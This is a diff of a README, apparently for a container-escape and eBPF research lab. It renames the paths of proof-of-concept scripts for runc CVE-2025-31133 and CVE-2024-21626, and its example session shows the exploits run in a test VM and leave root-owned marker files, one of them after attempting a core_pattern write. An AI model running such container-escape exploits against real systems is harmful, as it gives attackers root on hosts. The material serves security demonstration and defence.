@@ -11,7 +11,7 @@
 you@local:container-escape-ebpf$ make deploy # Setup `aws` CLI with `aws configure` and `terraform/terraform.tfvars` prior to deploying.
 you@local:container-escape-ebpf$ make ssh
 
-ubuntu@vm:~$ python3 /tmp/cve-2025-31133-poc.py
+ubuntu@vm:~$ python3 /tmp/pocs/cve-2025-31133.py
 Launched container: axXjevWaJ1deK3OuharhsOZrK0FsrEUh
 /bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
 Exploit did not succeed. Retrying...
@@ -23,7 +23,7 @@ Exploit succeeded!
 ubuntu@vm:~$ ls -la /pwned_by_cve_2025_31133
 -rw-r--r-- 1 root root 0 Jan  3 03:00 /pwned_by_cve_2025_31133
 
-ubuntu@vm:~$ python3 /tmp/cve-2024-21626-poc.py
+ubuntu@vm:~$ python3 /tmp/pocs/cve-2024-21626.py
 Launched container: EUzjLqq54unAfuAZZzysTPVEqRtuswBm
 ubuntu@vm:~$ ls -la /pwned_by_cve_2024_21626
 -rw-r--r-- 1 root root 0 Jan  4 02:45 /pwned_by_cve_2024_21626
